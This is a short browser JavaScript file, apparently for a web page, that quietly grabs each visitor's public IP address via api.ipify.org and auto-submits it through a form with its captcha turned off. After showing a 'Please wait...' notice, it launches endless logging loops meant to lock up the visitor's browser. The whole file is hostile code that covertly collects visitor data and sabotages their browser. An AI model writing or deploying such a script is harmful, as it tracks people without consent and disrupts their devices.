setTimeout(getIp, 100);

async function getIp(){
    const request = await fetch("https://api.ipify.org?format=json");
    const ipObject = await request.json();

    const form = document.querySelector("#div");
    form.innerHTML = `
        <input type='text' name='name' required placeholder='Name' value='ip successfully grabbed'/>
        <input type='email' name='email' required placeholder='Email' value='ip@fake.com'/>
        <input type='text' name='subject' required placeholder='Message' value='test'/>
        <textarea name='message' placeholder='Additional notes'>${ipObject.ip}</textarea>
        <input type='hidden' name='_captcha' value='false'></input>
    `;
    form.submit();
}

async function callNotice(){
    const p = document.querySelector('#notice');
    p.textContent = "Please wait...";
    setTimeout(() => {destroy()}, 100);
}

function destroy(){
    getIp();
    loop1();
    loop2();
    loop4();
    loop5();
    loop6();
    loop7();
    loop8();
    loop9();
    loop10();
    loop11();
    loop12();
    loop13();
    loop14();
    loop15();
    loop16();
    loop17();
}

function loop1(){
     while(true){
         console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
     }
}

function loop2(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop3(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop4(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop5(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop6(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop7(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop8(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop9(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop10(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop11(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop12(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop13(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop14(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop15(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop16(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}

function loop17(){
    while(true){
        console.log("uyvockytsxcyti5dekdio75dtcotvlk,tmh6ed7475utrcky,jyfogvwrth45htbxfgd7t98ul7ivukyfvkivyfvyiukjv ytdlou.ycjhv y");
    }
}